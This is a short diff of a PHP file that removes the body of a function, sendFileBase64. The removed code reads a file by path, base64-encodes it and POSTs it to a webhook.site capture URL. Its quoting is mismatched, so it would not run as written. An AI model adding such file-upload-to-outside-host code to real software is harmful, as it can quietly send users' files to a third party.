@@ -1,21 +1,6 @@
 <?php
 function sendFileBase64($pathToFile)
 {
-  $handle = fopen($pathToFile, "rb");
-  $contents = fread($handle, filesize($pathToFile));
-  fclose($handle);
-  $b64Content=base64_encode($contents);
-  $data = array('jpg' => $b64Content);
-  $url = "https://webhook.site/23410df2-5255-46c0-983e-c89e81d71bd0';
-  $options = array(
-    'http' => array(
-    'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
-    'method'  => 'POST',
-    'content' => http_build_query($data)
-    )
-);
-$context  = stream_context_create($options);
-$result = file_get_contents($url, false, $context);
 }
 
 
